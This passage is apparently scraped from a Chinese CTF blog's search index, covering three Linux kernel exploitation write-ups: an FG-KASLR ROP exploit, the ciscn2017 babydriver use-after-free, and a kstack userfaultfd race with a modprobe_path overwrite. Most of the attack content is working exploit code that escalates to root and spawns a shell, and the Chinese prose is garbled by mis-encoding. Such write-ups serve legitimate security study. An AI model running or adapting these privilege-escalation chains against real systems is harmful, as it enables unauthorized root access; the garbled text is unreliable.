&quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags), &quot;=r&quot;(user_sp) : : &quot;memory&quot;); printf(&quot;%lx %lx %lx %lx\\n&quot;, user_cs, user_ss, user_rflags, user_sp);}void print_leak(uint64_t leak[], int n){ for(int i = 0 ; i &lt; n ; i++){ printf(&quot;%d: %p\\n&quot;,i ,leak[i]); }}void get_gadget_offset(){ int n = 40; uint64_t leak[n]; read(global_fd, leak, sizeof(leak)); cookie = leak[2]; image_base = leak[38] - 0xa157; swapgs_restore_regs_and_ret_to_uspace = image_base + 0x200f10 + 19; zero_rax_ret = image_base + 0x3b91; pop_rax_ret = image_base + 0x4d11; mov_eax_ind_rax_ret = image_base + 0x4aae; pop_rdi_ret = image_base + 0x38a0; ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL; ksymtab_commit_creds = image_base + 0xf87d90UL; print_leak(leak, n); printf(&quot;cookie: %p\\n&quot;, cookie); printf(&quot;image base: %p\\n&quot;, image_base);}enum current_state global_cstate;void read_address(){ int write_n = 50; int i = 16; uint64_t rop[write_n]; rop[i++] = cookie; rop[i++] = 0; // rbx rop[i++] = 0x1; // r12 rop[i++] = 0x20000000; // rbp rop[i++] = pop_rax_ret; if(global_cstate == current_state_read_ksymtab_prepare_kernel_cred){ rop[i++] = ksymtab_prepare_kernel_cred - 0x10; } else if(global_cstate == current_state_read_ksymtab_commit_creds){ rop[i++] = ksymtab_commit_creds - 0x10; } else{ printf(&quot;state error&quot;); exit(-1); } rop[i++] = mov_eax_ind_rax_ret; rop[i++] = user_sp; // pop rbp rop[i++] = swapgs_restore_regs_and_ret_to_uspace; rop[i++] = 0xccdd; rop[i++] = 0x33333; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = (uint64_t)safe_exit; //rip rop[i++] = user_cs; rop[i++] = user_rflags; rop[i++] = user_sp; rop[i++] = user_ss; write(global_fd, rop, sizeof(rop)); // Should never be reached exit(-1);}void escalate_privileges(){ int write_n = 50; uint64_t rop[write_n]; int i = 16; rop[i++] = cookie; rop[i++] = 0x0; // rbx rop[i++] = 0x1; // r12 rop[i++] = 0x20000000; // rbp if (global_cstate == current_state_escalate_privileges_stage1){ rop[i++] = pop_rdi_ret; rop[i++] = 0; // rdi rop[i++] = user_sp; // rbp rop[i++] = prepare_kernel_cred; } else if(global_cstate == current_state_escalate_privileges_stage2){ rop[i++] = pop_rdi_ret; rop[i++] = creds_struct_va; // rdi rop[i++] = user_sp; // rbp rop[i++] = commit_creds; } rop[i++] = swapgs_restore_regs_and_ret_to_uspace; rop[i++] = 0xccdd; rop[i++] = 0x33333; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = (uint64_t)safe_exit; rop[i++] = user_cs; rop[i++] = user_rflags; rop[i++] = user_sp; rop[i++] = user_ss; write(global_fd, rop, sizeof(rop)); // Should never be reached exit(-1);}void safe_exit(){ uint64_t rax; uint64_t rbp; asm volatile( &quot;mov %%rax, %0\\n\\t&quot; : &quot;=r&quot;(rax), &quot;=r&quot;(rbp) ); printf(&quot;returned from kernel: %lx\\n&quot;, rax); if(global_cstate == current_state_read_ksymtab_prepare_kernel_cred){ prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)rax; global_cstate = current_state_read_ksymtab_commit_creds; read_address(); } else if(global_cstate == current_state_read_ksymtab_commit_creds){ commit_creds = ksymtab_commit_creds + (int)rax; printf(&quot;prepare_kernel_cred: 0x%lx\\n&quot;, prepare_kernel_cred); printf(&quot;commit_creds : 0x%lx\\n&quot;, commit_creds); global_cstate = current_state_escalate_privileges_stage1; escalate_privileges(); } else if(global_cstate == current_state_escalate_privileges_stage1){ creds_struct_va = rax; printf(&quot;creds_struct_va: 0x%lx\\n&quot;, creds_struct_va); global_cstate = current_state_escalate_privileges_stage2; escalate_privileges(); } else if(global_cstate == current_state_escalate_privileges_stage2){ if(getuid() == 0){ printf(&quot;Flag: \\n&quot;); FILE *f = fopen(&quot;/dev/sda&quot;, &quot;r&quot;); fread(flag_buf, 1, sizeof(flag_buf), f); puts(flag_buf); system(&quot;/bin/sh&quot;); } else{ printf(&quot;not root yet\\n&quot;); exit(-1); } }}int main(){ save_state(); global_fd = open_dev(); get_gadget_offset(); global_cstate = current_state_read_ksymtab_prepare_kernel_cred; read_address(); return 0;} å‚è€ƒï¼šhttps://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/","link":"/2021/02/10/kernel_pwn(fg_kaslr)/"},{"title":"kernel_pwn UAF","text":"kernel_pwn UAF å†…æ ¸çš„UAFå’Œç”¨æˆ·æ€çš„å·®ä¸å¤šï¼Œä¸åŒçš„æ˜¯å†…æ ¸ä½¿ç”¨çš„æ˜¯slab/slubåˆ†é…å™¨æ¥ç®¡ç†å †å—ã€‚é¢˜ç›®æ¥æºï¼šciscn2017_babydriver æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼š 12#!/bin/bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep å¼€å¯äº†smepä¿æŠ¤ï¼ˆå†…æ ¸æ€ä¸å¯æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ï¼‰ã€‚æŸ¥çœ‹initï¼š 123456789101112131415161718#!/bin/shmount -t proc none /procmount -t sysfs none /sysmount -t devtmpfs devtmpfs /devchown root:root flagchmod 400 flagexec 0&lt;/dev/consoleexec 1&gt;/dev/consoleexec 2&gt;/dev/consoleinsmod /lib/modules/4.4.72/babydriver.kochmod 777 /dev/babydevecho -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot;setsid cttyhack setuidgid 1000 shumount /prockumount /syspoweroff -d 0 -f çœ‹åˆ°åŠ è½½äº†babydriver.koæ¨¡å—ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æ¼æ´çš„lkmäº†ï¼Œidaæ‰“å¼€å¼€å§‹å¹²æ´»ï¼šå…³é”®å‡½æ•°babyopen(): 12345678910int __fastcall babyopen(inode *inode, file *filp){ __int64 v2; // rdx _fentry__(inode, filp); babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL); babydev_struct.device_buf_len = 0x40LL; printk(&quot;device open\\n&quot;, 0x24000C0LL, v2); return 0;} é¦–å…ˆçœ‹åˆ°å…¨å±€çš„ç»“æ„ä½“babydev_structæœ‰ä¸¤ä¸ªæˆå‘˜ï¼š 1234567babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429)00000000 ; XREF: .bss:babydev_struct/r00000000 device_buf dq ? ; XREF: babyrelease+6/r00000000 ; babyopen+26/w ... ; offset00000008 device_buf_len dq ? ; XREF: babyopen+2D/w00000008 ; babyioctl+3C/w ...00000010 babydevice_t ends æ¯å½“æ‰“å¼€ä¸€ä¸ªè®¾å¤‡æ—¶ï¼Œéƒ½ä¼šé€šè¿‡kmallocç”³è¯·å¤§å°ä¸º0x40çš„å†…å­˜å…¶ptrèµ‹ç»™device_buf,0x40ç»™åˆ°device_buf_lenã€‚ç”±äºå®ƒæ˜¯å®šä¹‰åœ¨å…¨å±€çš„ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ¯æ¬¡openéƒ½ä¼šæ›´æ–°è¯¥structçš„å†…å®¹ã€‚æ¥ä¸‹æ¥baby_ioctl(): 123456789101112131415161718192021222324__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){ size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx __int64 result; // rax _fentry__(filp, *(_QWORD *)&amp;command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL); babydev_struct.device_buf_len = v4; printk(&quot;alloc done\\n&quot;, 0x24000C0LL, v5); result = 0LL; } else { printk(&amp;unk_2EB, v3, v3); result = -22LL; } return result;} å…ˆkfreeæ‰structé‡Œdevice_bufæŒ‡å‘çš„å†…å­˜ï¼Œä¹‹åkamllocå¤§å°å¯æ§çš„å†…å­˜å¹¶æ›´æ–°ç»“æ„ä½“ã€‚baby_write(): 123456789101112131415161718ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){ size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &gt; v4 ) { v6 = v4; copy_from_user(); result = v6; } return result;} å¯ä»¥å‘ç»“æ„ä½“é‡Œçš„device_bufå†™å…¥å†…å®¹ã€‚ baby_release(): 123456789int __fastcall babyrelease(inode *inode, file *filp){ __int64 v2; // rdx _fentry__(inode, filp); kfree(babydev_struct.device_buf); printk(&quot;device release\\n&quot;, filp, v2); return 0;} kfreeæ‰device_bufï¼Œä½†æ²¡ç½®0ã€‚ åˆ†æå®Œæˆ‘ä»¬å¯ä»¥å‘ç°é—®é¢˜å°±åœ¨äºæˆ‘ä»¬æ— è®ºæ˜¯ä»€ä¹ˆæ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªbabydev_structç»“æ„ä½“ï¼Œä½†è¿™ä¸ªç»“æ„ä½“æ˜¯å…¨å±€çš„ï¼Œå¦‚æœæˆ‘ä»¬openä¸¤æ¬¡çš„è¯ç¬¬ä¸€æ¬¡kmallocçš„ptrå°±ä¼šè¢«ç¬¬äºŒæ¬¡kmallocçš„ptrè¦†ç›–ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— è®ºæ˜¯å¯¹fd1è¿›è¡Œæ“ä½œè¿˜æ˜¯å¯¹fd2è¿›è¡Œæ“ä½œå°†ä¼šæ˜¯åŒä¸€å—å†…å­˜ï¼Œå¦‚æœclose(fd1)è€Œå¯¹fd2è¿›è¡Œæ“ä½œå°±å¯å®ç°UAFçš„æ•ˆæœã€‚ é‚£è¯¥å¦‚ä½•ææƒå‘¢ï¼Ÿå®¹æ˜“æƒ³åˆ°åŠ«æŒcredç»“æ„ä½“æ”¹å†™uidgidï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹ï¼š1.openä¸¤æ¬¡å¾—åˆ°fd1.fd22.åˆ©ç”¨ioctlæ”¹structä¿å­˜0xc8å¤§å°çš„å †å—(credç»“æ„ä½“å¤§å°ä¸º0xa8)3.close(fd1)æ­¤æ—¶0xa8å¤§å°çš„å†…å­˜è¢«kfree()4.forkå‡ºå­è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹åˆ›å»ºæ—¶ä¼šç”³è¯·å­˜æ”¾credç»“æ„ä½“çš„å†…å­˜ï¼Œæ­¤æ—¶åˆšè¢«kfreeçš„å †å—è¢«ç”³è¯·å‡ºæ¥ã€‚5.é€šè¿‡å¯¹fd2è¿›è¡Œwriteæ“ä½œæ”¹å†™credç»“æ„ä½“çš„uidgid=0å®Œæˆææƒã€‚ è°ƒè¯•ï¼šæ‰§è¡Œå®Œç¬¬äºŒæ­¥çš„ç»“æ„ä½“: 1234gefâ¤ x/20gx 0xffffffffc00024c9-10xffffffffc00024c8: 0x0000000000000000 0xffff880003ce16c00xffffffffc00024d8: 0x00000000000000a8 0x00000000000000000xffffffffc00024e8: 0x0000000000000000 0x0000000000000000 writeå‰(å·²ç»åŠ«æŒcred): 12345678gefâ¤ x/20gx 0xffff880003ce16c0-0x100xffff880003ce16b0: 0x0000000000000000 0x00000000000000000xffff880003ce16c0: 0x000003e800000002 0x000003e8000003e80xffff880003ce16d0: 0x000003e8000003e8 0x000003e8000003e80xffff880003ce16e0: 0x00000000000003e8 0x00000000000000000xffff880003ce16f0: 0x0000000000000000 0x00000000000000000xffff880003ce1700: 0x0000003fffffffff 0x00000000000000000xffff880003ce1710: 0x0000000000000000 0x0000000000000000 writeå: 12345678gefâ¤ x/20gx 0xffff880003ce16c0-0x100xffff880003ce16b0: 0x0000000000000000 0x00000000000000000xffff880003ce16c0: 0x0000000000000000 0x00000000000000000xffff880003ce16d0: 0x0000000000000000 0x000003e8000000000xffff880003ce16e0: 0x00000000000003e8 0x00000000000000000xffff880003ce16f0: 0x0000000000000000 0x00000000000000000xffff880003ce1700: 0x0000003fffffffff 0x00000000000000000xffff880003ce1710: 0x0000000000000000 0x0000000000000000 å¯¹ç…§å†…æ ¸credç»“æ„ä½“æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839struct cred { atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */}; exp: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main(){ int fd1 = open(&quot;/dev/babydev&quot;, 2); int fd2 = open(&quot;/dev/babydev&quot;, 2); ioctl(fd1, 0x10001, 0xa8); close(fd1); int pid = fork(); if(pid == 0) { char zeros[30] = {0}; write(fd2, zeros, 28); if(getuid() == 0) { system(&quot;/bin/sh&quot;); exit(0); } } else { wait(NULL); } close(fd2); return 0;}","link":"/2020/11/09/kernel_pwn(3)/"},{"title":"kernel_pwn userfaultfd","text":"kernel_pwn userfaultfd userfaultfdçš„åˆ©ç”¨å§¿åŠ¿æ˜¯åœ¨realworld ctfçš„è®®é¢˜ç›´æ’­é‡Œè·Ÿç€BrieflyXå¤§ä½¬å­¦ä¹ çš„ï¼Œå¯¹è¯¥æ–¹æ³•å¾ˆæ˜¯å¥½å¥‡ï¼Œèµ›åå°±è°ƒäº†ä¸‹kstackã€‚ userfaultfdæ˜¯ç§page faultçš„å¤„ç†æ–¹å¼ã€‚æ­£å¸¸å‘ç”Ÿé¡µç¼ºå¤±ä¼šå¼•å‘å¼‚å¸¸ï¼Œäº¤ç»™å†…æ ¸é‡Œçš„å¼‚å¸¸å¤„ç†ç¨‹åºå»è§£å†³ï¼Œä½†userfaultedæ˜¯è®©ç”¨æˆ·æ€çš„ç¨‹åºå»å¤„ç†è‡ªå·±çš„page faultã€‚userfaultfdå…·ä½“çš„å·¥ä½œæµç¨‹ä»¥åŠå®ç°æœºåˆ¶åœ¨BrieflyXçš„åšå®¢é‡Œè®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä¸»è¦è®°å½•ä¸‹åškstackçš„è¿‡ç¨‹æ¥åŠ æ·±å¯¹è¯¥æœºåˆ¶çš„ç†è§£ã€‚ kstacké¢˜ç›®ç»™å‡ºäº†æºç ï¼Œå®ç°äº†pushå’Œpopæ“ä½œï¼Œæ¶‰åŠçš„ç»“æ„ä¸ºï¼š 12345typedef struct _Element { int owner; unsigned long value; struct _Element *fd;} Element; owneræ ‡è¯†æ‰€å±è¿›ç¨‹çš„PIDï¼Œvalueå³å­˜å‚¨çš„æ•°æ®ï¼ŒfdæŒ‡å‘ä¸‹ä¸€ä¸ª_Elementç»“æ„ä½“ï¼ˆä»¥é“¾è¡¨çš„æ–¹å¼ç»„ç»‡ï¼‰ã€‚ ä¸»è¦é€»è¾‘åœ¨proc_ioctl()å‡½æ•°é‡Œï¼š 123456789101112131415161718192021222324252627282930313233343536static long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){ Element *tmp, *prev; int pid = task_tgid_nr(current); switch(cmd) { case CMD_PUSH: tmp = kmalloc(sizeof(Element), GFP_KERNEL); tmp-&gt;owner = pid; tmp-&gt;fd = head; head = tmp; if (copy_from_user((void*)&amp;tmp-&gt;value, (void*)arg, sizeof(unsigned long))) { head = tmp-&gt;fd; kfree(tmp); return -EINVAL; } break; case CMD_POP: for(tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp-&gt;fd) { if (tmp-&gt;owner == pid) { if (copy_to_user((void*)arg, (void*)&amp;tmp-&gt;value, sizeof(unsigned long))) return -EINVAL; if (prev) { prev-&gt;fd = tmp-&gt;fd; } else { head = tmp-&gt;fd; } kfree(tmp); break; } if (tmp-&gt;fd == NULL) return -EINVAL; } break; } return 0;} é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•äº†ï¼Œpushå…ˆkmallocä¸€ä¸ªsizeof(Element)å¤§å°çš„å†…å­˜ï¼Œä¹‹åè®¾ç½®ownerå¹¶é€šè¿‡å¤´æ’æ³•è¿å…¥é“¾è¡¨ï¼Œä¹‹åè°ƒç”¨copy_from_userä»ç”¨æˆ·åŒºåŸŸè¯»å…¥æ•°æ®åˆ°valueï¼Œç„¶åæŠŠè¯¥ç»“ç‚¹åˆ é™¤å¹¶kfreeã€‚ popçš„è¯ä»å¤´éƒ¨æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å±äºè¯¥è¿›ç¨‹çš„ç»“ç‚¹ï¼Œä¹‹åå°†è¯¥ç»“ç‚¹valueæ‹·è´åˆ°ç”¨æˆ·åŒºåŸŸï¼Œç„¶åæŠŠzheè¯¥ç»“ç‚¹åˆ é™¤å¹¶kfreeã€‚ çœ‹èµ·æ¥é€»è¾‘æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜æ˜¯æ•´ä¸ªè¿‡ç¨‹æ²¡æœ‰åŠ é”ï¼Œå¹¶ä¸”å¯¹ç»“ç‚¹çš„åˆ é™¤æ“ä½œæ˜¯åœ¨copy_from_user()å’Œcopy_to_user()ä¹‹åçš„ã€‚ é‚£ä¹ˆå¦‚æœå¸¦ç€åˆ©ç”¨userfaultfdæ„é€ raceçš„æƒ³æ³•å†çœ‹è¿™ä¸ªé€»è¾‘çš„è¯å¦‚æœåœ¨pushæ—¶æ‰§è¡Œåˆ°copy_from_user()ï¼Œç”±äºç”¨æˆ·åŒºåŸŸargæ˜¯éœ€è¦userfaultfdçš„ï¼Œåˆ™è¯¥çº¿ç¨‹å°±ä¼šé˜»å¡åœ¨è¿™é‡Œï¼Œæ­¤æ—¶äº¤ç»™ç”¨æˆ·æ€çš„fault_handler_threadçº¿ç¨‹å¤„ç†ã€‚è¯¥çº¿ç¨‹æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå¦‚æœå†æ§åˆ¶è¯¥çº¿ç¨‹æ‰§è¡Œpopæ“ä½œï¼Œæ­¤æ—¶å°±ä¼šå°†ä¹‹å‰pushçš„ç»“ç‚¹é‡Œçš„valueæ‹·è´åˆ°ç”¨æˆ·åŒºåŸŸã€‚ å› æ­¤å°±è¦æƒ³åŠæ³•ä½¿å¾—pushæ—¶kmallocæ‹¿åˆ°çš„chunkå¯¹åº”ç»“ç‚¹valueçš„ä½ç½®å­˜æ”¾æœ‰kernelé‡Œçš„åœ°å€ï¼Œè¿™é‡Œç”¨åˆ°çš„ä¸€ä¸ªæ–¹æ³•æ—¶åˆ©ç”¨shm_file_dateï¼š 123456struct shm_file_data{ int id; struct ipc_namespace *ns; struct file *file; const struct vm_operations_struct *vm_ops;} è¯¥ç»“æ„ä½“æ€»çš„å¤§å°å’ŒElementå¤§å°å·®ä¸å¤šï¼Œé€šè¿‡slabåˆ†é…0x24å¤§å°çš„chunkå­˜æ”¾ã€‚ é€šè¿‡è°ƒç”¨shmgetå»ºç«‹ä¸€ä¸ªå…±äº«å†…å­˜å¯¹è±¡ï¼Œå¹¶shmatå°†å¯¹è±¡æ˜ å°„åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä¹‹åé€šè¿‡shmdtåˆ é™¤ï¼Œåˆ™shm_file_dataä¹Ÿä¼šè¢«freeï¼Œä¹‹åå†é€šè¿‡pushçš„kmallocæ—¶å°±ä¼šæ‹¿åˆ°åˆšåˆšfreeçš„chunkï¼ŒåŒæ—¶å¯¹åº”vauleçš„ä½ç½®è¿˜æ®‹ç•™ç€ä¹‹å‰struct ipc_namespace *nsçš„å†…å®¹ï¼Œè¯¥æŒ‡é’ˆä¸€èˆ¬æŒ‡å‘å­˜åœ¨äº†çš„general namespaceï¼Œè¯¥åœ°å€æ—¶kernelçš„åœ°å€ï¼Œä»è€Œé…åˆä¸Šé¢çš„popåˆ°è¾¾leakåœ°å€çš„æ•ˆæœã€‚ è¿™é‡Œä¹Ÿæä¸€ä¸‹å¦‚ä½•åˆ›å»ºå¹¶æ³¨å†Œä¸€ä¸ªéœ€è¦é€šè¿‡userfaultfdçš„å¯¹è±¡ï¼š åˆ›å»ºä¸€ä¸ªuserfaultfdå¯¹è±¡ï¼š 123456789uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);if(uffd == -1){ errExit(&quot;userfaultfd&quot;);}uffdio_api.api = UFFD_API;uffdio_api.features = 0;if(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == -1){ errExit(&quot;ioctl-UFFDIO_API&quot;);} ä¹‹åmmapä¸€å—å†…å­˜ï¼Œmmapå‡ºæ¥çš„å†…å­˜åªæœ‰åœ¨çœŸæ­£ä½¿ç”¨åˆ°æ—¶æ‰ä¼šæ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œå› æ­¤å¯¹mmapå‡ºæ¥å†…å­˜çš„ç¬¬ä¸€ä¸ªr/wæ“ä½œä¼šè§¦å‘page faultã€‚ 123456page_size = sysconf(_SC_PAGE_SIZE);len = 4 * page_size;addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);if(addr == MAP_FAILED){ errExit(&quot;mmap&quot;);} ç„¶åå°†åŒºåŸŸæ³¨å†Œä¸ºuserfaultfdå¤„ç†æœºåˆ¶: 123456uffdio_register.range.start = (unsigned long)addr;uffdio_register.range.len = len;uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;if(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == -1){ errExit(&quot;ioctl-UFFDIO_REGISTER&quot;);} leakå®Œåœ°å€åç»§ç»­åˆ©ç”¨userfaultfdçš„æœºåˆ¶ï¼Œpopä¸€ä¸ªéœ€è¦userfaultfdçš„å†…å­˜ï¼Œåœ¨æ‰§è¡Œåˆ°copy_to_user()æ—¶é˜»å¡ï¼Œæ­¤æ—¶åœ¨fault_handler_threadçº¿ç¨‹ä¸­å†æ‰§è¡Œä¸€æ¬¡popï¼Œç”±äºåˆ é™¤æ“ä½œè¿˜æœªæ‰§è¡Œï¼Œå› æ­¤å¤„ç†çš„æ˜¯åŒä¸€ä¸ªç»“ç‚¹ï¼Œåœ¨handlerçº¿ç¨‹é‡Œå°†è¯¥ç»“ç‚¹åˆ é™¤åå”¤é†’é˜»å¡åœ¨copy_to_user()çš„çº¿ç¨‹ç»§ç»­æ‰§è¡Œåˆ é™¤æ“ä½œï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªç»“ç‚¹è¢«freeä¸¤æ¬¡é€ æˆdouble freeã€‚ æœ‰äº†åœ°å€å’Œdouble freeæ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•ææƒæˆ–æ‹¿flagäº†ã€‚è¦åˆ©ç”¨double freeçš„è¯è¦æƒ³åŠæ³•ä¿®æ”¹chunkçš„å‰8ä¸ªå­—èŠ‚ä¸ºç›®çš„åœ°å€ï¼Œä»…ä»…é€šè¿‡pushçš„kmallocæ˜¯æ— æ³•å®ç°çš„è¿™é‡Œç”¨åˆ°äº†userfaultfd + setxattrçš„ç»„åˆæ‹³ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445static longsetxattr(struct dentry *d, const char __user *name, const void __user *value, size_t size, int flags){ int error; void *kvalue = NULL; void *vvalue = NULL; /* If non-NULL, we used vmalloc() */ char kname[XATTR_NAME_MAX + 1]; if (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE)) return -EINVAL; error = strncpy_from_user(kname, name, sizeof(kname)); if (error == 0 || error == sizeof(kname)) error = -ERANGE; if (error &lt; 0) return error; if (size) { if (size &gt; XATTR_SIZE_MAX) return -E2BIG;[1] kvalue = kmalloc(size, GFP_KERNEL | __GFP_NOWARN); if (!kvalue) { vvalue = vmalloc(size); if (!vvalue) return -ENOMEM; kvalue = vvalue; }[2] if (copy_from_user(kvalue, value, size)) { error = -EFAULT; goto out; } if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) || (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0)) posix_acl_fix_xattr_from_user(kvalue, size); } error = vfs_setxattr(d, kname, kvalue, size, flags);out: if (vvalue) vfree(vvalue); else[7] kfree(kvalue); return error;} setxattræºç é‡Œæ³¨æ„åˆ°[1]å¤„kmallocä¸€ä¸ªå¯æ§sizeçš„chunkï¼Œä¹‹åå°†valueå†…å®¹çš„sizeé•¿åº¦æ‹·è´åˆ°kmallocç”³è¯·çš„chunké‡Œï¼Œå¦‚æœvalueå¤„äºä¸¤ä¸ªé¡µçš„äº¤æ±‡å¤„ï¼Œå³valueçš„å†…å®¹åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¡µé¢çš„æœ«å°¾ï¼Œè€Œåœ¨size-value_sizeçš„éƒ¨åˆ†åœ¨ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œè€Œè¯¥é¡µé¢ä¼šè§¦å‘page faultä¸”è¢«æ³¨å†Œä¸ºuserfaultfdï¼Œåˆ™ä¼šå¯¼è‡´åœ¨æ‰§è¡Œ[2]copy_from_user()æ—¶ï¼Œå¤„äºæ­£å¸¸é¡µé¢çš„value_sizeçš„å†…å®¹ä¼šè¢«æ­£å¸¸æ‹·è´ï¼Œè€Œä¹‹ååˆ°ä¸‹ä¸€ä¸ªé¡µé¢æ—¶ä¼šè§¦å‘userfaultedäº¤ç»™handler_threadå¤„ç†ã€‚ è¿™é‡ŒBrieflyXæ‹¿flagçš„æ–¹æ³•æ˜¯å°†modprobe_path - 8çš„åœ°å€æ”¾åœ¨ä¸€ä¸ªé¡µçš„æœ€å8ä¸ªå­—èŠ‚ä½ç½®ä¸Šï¼Œä¸‹ä¸€ä¸ªé¡µæ³¨å†Œä¸ºuserfaultedã€‚ ä¹‹åé€šè¿‡setxattr()ä¿®æ”¹double freeçš„chunkå¤´å…«ä¸ªå­—èŠ‚ä¸ºmodprobe_path - 8çš„åœ°å€ï¼Œä¹‹ååœ¨handler_threadçº¿ç¨‹é‡Œåˆ©ç”¨ä¸¤æ¬¡pushå–å‡ºmodprobe_path - 8çš„å†…å­˜ï¼Œå¹¶ä¿®æ”¹modprobe_pathä¸º/tmp/xã€‚ xæ–‡ä»¶å†…å®¹æå‰è¢«è®¾ç½®system(&quot;echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' &gt; /tmp/x &quot;);system(&quot;chmod +x /tmp/x&quot;);ï¼Œmodprobe_pathå…¶å®å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè¯¥æ–‡ä»¶åœ¨ç³»ç»Ÿè¯•å›¾æ‰§è¡Œä¸€ä¸ªæ— æ³•æ‰§è¡Œï¼ˆé™¤elfå’Œshellè„šæœ¬#!ï¼‰çš„ç¨‹åºåæ‰§è¡Œã€‚ å› æ­¤æå‰è®¾ç½®ä¸€ä¸ªæ— æ³•è¯†åˆ«æ‰§è¡Œçš„è„šæœ¬system(&quot;echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/dummy&quot;);system(&quot;chmod +x /tmp/dummy&quot;);ã€‚ æ­¤æ—¶æ‰§è¡Œdummyæ–‡ä»¶ï¼Œç³»ç»Ÿä¼šæŠ¥é”™ï¼Œæ¥ç€ä¾¿ä¼šæ‰§è¡Œmodprobe_pathçš„xæ–‡ä»¶ï¼Œä»è€Œä¿®æ”¹flagæƒé™ä¸º777ï¼Œä¹‹åsystem(&quot;cat /flag&quot;)æ‹¿åˆ°flagã€‚ userfaultfdå°±åƒæ˜¯åœ¨copy_to/from_user()å¤„ä¸‹äº†æ–­ç‚¹ï¼Œå½¢æˆä¸€ä¸ªç¨³å®šçš„raceçª—å£ï¼Œå…·æœ‰è¾ƒå¼ºçš„é€šç”¨å‹ï¼Œè¿™é‡Œçš„é‡ç‚¹åœ¨äºhandler_threadçš„æ„é€ 